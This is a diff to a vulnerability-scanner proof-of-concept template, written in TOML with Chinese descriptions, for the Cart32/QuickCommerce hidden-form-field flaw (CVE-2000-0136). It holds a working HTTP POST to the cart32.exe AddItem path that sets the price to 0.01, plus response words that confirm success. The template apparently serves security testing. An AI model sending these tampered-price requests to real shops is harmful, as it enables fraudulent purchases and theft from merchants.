@@ -1,25 +1,25 @@
 [info]
-author = "AVE"
-description = "通过 HTTP POST 请求发送篡改后的隐藏表单字段参数（如修改 Price 值），验证目标购物车程序是否在服务端校验商品价格等隐藏字段。若服务端未校验，攻击者可实现任意价格购买。参考 ExploitDB 19951 实际利用代码。"
+author = "ave"
+description = "通过向购物车应用的 CGI 接口发送特制 POST 请求，修改隐藏表单字段中的价格参数，实现低价购买商品。攻击者无需身份认证，仅需构造包含篡改后价格的 HTTP POST 数据包即可。"
 id = "POC-AVE-2000-0406"
-name = "Cart32 / QuickCommerce 等多款购物车程序隐藏表单字段漏洞 PoC"
+name = "Cart32/QuickCommerce/Shop Express/StoreCreator 购物车系统隐藏表单字段信息修改漏洞 PoC"
 severity = "high"
-tags = ["cve-2000-0136"]
+tags = ["ave-2000-0406"]
 vuln_id = [
     "CVE-2000-0136",
     "AVE-2000-0406",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/cart32.exe/justsocks-AddItem"
+path = "/{{BaseURL}}/cgi-bin/cart32.exe/AddItem"
 protocol = "http"
 
 [poc.requests.body]
-content = "Price=0.01&Item=Test+Item&PartNo=F6092&Qty=1&p1=XL&t1=d-Size%3BS%3BM%3BL%3BXL&p2=Black&t2=d-Color%3BBlack%3BWhite"
+content = "Price=0.01&Item=Test+Item&PartNo=TEST001&Qty=1"
 type = "raw"
 
 [poc.requests.headers]
@@ -31,8 +31,8 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Thank you",
-    "Order",
-    "Confirmation",
-    "successfully",
+    "Added",
+    "added",
+    "Cart",
+    "cart",
 ]
